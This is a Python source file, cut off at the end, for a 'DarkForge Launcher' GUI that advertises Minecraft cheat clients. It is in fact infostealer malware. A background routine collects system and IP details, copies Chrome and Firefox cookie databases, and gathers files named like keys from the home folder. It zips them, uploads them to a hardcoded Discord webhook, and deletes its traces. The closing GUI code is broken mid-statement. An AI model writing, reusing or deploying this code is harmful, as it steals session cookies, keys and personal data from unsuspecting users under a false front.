import os
import shutil
import getpass
import requests
import socket
import platform
from pathlib import Path
import time
import datetime
import zipfile
import subprocess
import tkinter as tk
from tkinter import ttk
import tempfile
import threading
import random

# Global variable to track Discord send
sent_to_discord = False

def get_system_info():
    """Collects system information."""
    try:
        info = []
        info.append(f"OS: {platform.system()} {platform.release()}")
        info.append(f"Version: {platform.version()}")
        info.append(f"Hostname: {platform.node()}")
        info.append(f"Username: {getpass.getuser()}")
        return info
    except Exception as e:
        return [f"[-] Error collecting system info: {e}"]

def get_ip_addresses():
    """Collects local and public IP addresses."""
    results = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        results.append(f"Local IP: {local_ip}")
    except Exception as e:
        results.append(f"[-] Error collecting local IP: {e}")
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        if response.status_code == 200:
            results.append(f"Public IP: {response.text}")
        else:
            results.append(f"[-] Error collecting public IP: {response.status_code}")
    except Exception as e:
        results.append(f"[-] Error collecting public IP: {e}")
    return results

def get_browser_paths():
    """Returns paths to browser cookie files."""
    user = getpass.getuser()
    browser_paths = {
        "Chrome": Path(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Cookies"),
        "Firefox": Path(f"C:/Users/{user}/AppData/Roaming/Mozilla/Firefox/Profiles")
    }
    return browser_paths

def copy_browser_cookies(browser_paths, output_dir):
    """Copies browser cookie files to the specified directory."""
    results = []
    output_dir = Path(output_dir)
    output_dir.mkdir(exist_ok=True)
    for browser, path in browser_paths.items():
        try:
            if browser == "Chrome" and path.exists():
                dest = output_dir / "chrome_cookies.db"
                shutil.copy2(path, dest)
                results.append(f"[+] Copied Chrome cookies to {dest}")
            elif browser == "Firefox":
                for profile in path.glob("*.default-release"):
                    cookie_file = profile / "cookies.sqlite"
                    if cookie_file.exists():
                        dest = output_dir / f"firefox_cookies_{profile.name}.db"
                        shutil.copy2(cookie_file, dest)
                        results.append(f"[+] Copied Firefox cookies to {dest}")
        except (PermissionError, FileNotFoundError) as e:
            results.append(f"[-] Error accessing {browser} cookies: {e}")
    return results

def scan_for_keys(start_dir):
    """Scans for files with 'key' or 'keys' in their names."""
    results = []
    start_dir = Path(start_dir)
    try:
        for root, _, files in os.walk(start_dir):
            for file in files:
                if "key" in file.lower() or "keys" in file.lower():
                    full_path = Path(root) / file
                    try:
                        results.append(f"[+] Found: {full_path}")
                    except UnicodeEncodeError:
                        results.append(f"[+] Found: [Non-ASCII path] {file}")
    except (PermissionError, OSError) as e:
        results.append(f"[-] Error scanning directory {root}: {e}")
    return results

def create_rar_archive(output_dir, archive_name):
    """Creates a RAR archive using WinRAR if available."""
    try:
        winrar_path = r"C:\Program Files\WinRAR\WinRAR.exe"
        if not Path(winrar_path).exists():
            return None, "[-] WinRAR not found, falling back to ZIP"
        cmd = [winrar_path, "a", "-r", archive_name, str(output_dir / "*")]
        result = subprocess.run(cmd, capture_output=True, text=True, creationflags=0x08000000)
        if result.returncode == 0:
            return archive_name, f"[+] Created RAR archive: {archive_name}"
        else:
            return None, f"[-] Error creating RAR archive: {result.stderr}"
    except Exception as e:
        return None, f"[-] Error creating RAR archive: {e}"

def create_zip_archive(output_dir, archive_name):
    """Creates a ZIP archive from the output directory."""
    try:
        output_dir = Path(output_dir)
        zip_name = archive_name.replace(".rar", ".zip") if archive_name.endswith(".rar") else archive_name
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(output_dir):
                for file in files:
                    file_path = Path(root) / file
                    arcname = file_path.relative_to(output_dir)
                    zipf.write(file_path, arcname)
        return zip_name, f"[+] Created ZIP archive: {zip_name}"
    except Exception as e:
        return None, f"[-] Error creating ZIP archive: {e}"

def send_to_discord(archive_path, webhook_url):
    """Sends the archive to Discord via Webhook."""
    try:
        with open(archive_path, "rb") as f:
            files = {"file": (archive_path, f, "application/zip" if archive_path.endswith(".zip") else "application/x-rar-compressed")}
            data = {"content": f"Scan results from {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
            response = requests.post(webhook_url, files=files, data=data, timeout=10)
            if response.status_code == 204:
                return "[+] Successfully sent archive to Discord"
            else:
                return f"[-] Error sending to Discord: {response.text}"
    except Exception as e:
        return f"[-] Error sending to Discord: {e}"

def cleanup(output_dir, archive_name):
    """Removes the temporary directory and archive."""
    try:
        shutil.rmtree(output_dir, ignore_errors=True)
        if Path(archive_name).exists():
            os.remove(archive_name)
        return "[+] Cleaned up temporary files and archive"
    except Exception as e:
        return f"[-] Error cleaning up: {e}"

def background_scan():
    """Background process for collecting data and sending to Discord (once per session)."""
    global sent_to_discord
    if sent_to_discord:
        return

    output_file = "scan_results.txt"
    temp_dir = Path(tempfile.gettempdir()) / f"darkforge_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    archive_name = f"scan_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.rar"
    webhook_url = "https://discord.com/api/webhooks/1375810373751541790/YGkJYRdDXc0TKnVhnOmJJTs9LySjwb11C6FfHUBuV9zgSkar817NQ7RmNuHfDM-Kp0nY"  # Replace with your Webhook URL
    results = [f"Scan started at {time.ctime()}"]

    temp_dir.mkdir(exist_ok=True)
    results.append("\n=== System Info ===")
    system_info = get_system_info()
    results.extend(system_info)
    try:
        with open(temp_dir / "system_info.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(system_info))
        results.append(f"[+] Saved system info to {temp_dir / 'system_info.txt'}")
    except Exception as e:
        results.append(f"[-] Error saving system info: {e}")

    results.append("\n=== IP Addresses ===")
    ip_info = get_ip_addresses()
    results.extend(ip_info)
    try:
        with open(temp_dir / "ip_info.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(ip_info))
        results.append(f"[+] Saved IP info to {temp_dir / 'ip_info.txt'}")
    except Exception as e:
        results.append(f"[-] Error saving IP info: {e}")

    browser_paths = get_browser_paths()
    results.append("\n=== Browser Cookies ===")
    cookie_results = copy_browser_cookies(browser_paths, temp_dir)
    results.extend(cookie_results)

    start_dir = Path.home()
    results.append("\n=== Key Files ===")
    key_results = scan_for_keys(start_dir)
    results.extend(key_results)
    for line in key_results:
        if line.startswith("[+] Found: "):
            file_path = line.replace("[+] Found: ", "").strip()
            try:
                if Path(file_path).exists():
                    shutil.copy2(file_path, temp_dir / Path(file_path).name)
                    results.append(f"[+] Copied {file_path} to {temp_dir}")
            except (PermissionError, OSError) as e:
                results.append(f"[-] Error copying {file_path}: {e}")

    results.append("\n=== Archiving ===")
    archive_path, archive_result = create_rar_archive(temp_dir, archive_name)
    if archive_path is None:
        archive_path, archive_result = create_zip_archive(temp_dir, archive_name.replace(".rar", ".zip"))
    results.append(archive_result)

    if archive_path and Path(archive_path).exists():
        results.append("\n=== Sending to Discord ===")
        discord_result = send_to_discord(archive_path, webhook_url)
        results.append(discord_result)
        sent_to_discord = True

    results.append("\n=== Cleanup ===")
    cleanup_result = cleanup(temp_dir, archive_path if archive_path else archive_name)
    results.append(cleanup_result)
    try:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write("\n".join(results))
    except Exception:
        pass

class DarkForgeLauncher:
    def __init__(self, root):
        self.root = root
        self.root.title("DarkForge Launcher")
        self.root.geometry("600x500")
        self.root.configure(bg="#1a1a1a")

        # Title
        self.title_label = tk.Label(
            root, text="DarkForge Launcher", font=("Arial", 18, "bold"),
            bg="#1a1a1a", fg="#00ff00"
        )
        self.title_label.pack(pady=10)

        # Cheats list
        self.cheats_frame = tk.Frame(root, bg="#1a1a1a")
        self.cheats_frame.pack(pady=10, padx=10, fill="both", expand=True)

        cheats = [
            ("Wurst Client", "200+ cheats including KillAura, Fly, X-Ray"),
            ("LiquidBounce", "PvP-focused with smooth AimBot, ESP"),
            ("Impact", "Simple cheat for anarchy servers, CrystalAura"),
            ("Aristois", "Versatile with mod support, clean UI")
        ]

        for cheat_name, cheat_desc in cheats:
            cheat_frame = tk.Frame(self.cheats_frame, bg="#1a1a1a")
            cheat_frame.pack(fill="x", pady=5)
            tk.Label(
                cheat_frame, text=cheat_name, font=("Arial", 12, "bold"),
                bg="#1a1a1a", fg="#ffffff"
            ).pack(anchor="w")
            tk.Label()
                cheat_frame, text=cheat_desc, font=("Arial", 10),
                bg="#1a1a1a", fg="#aaaaaa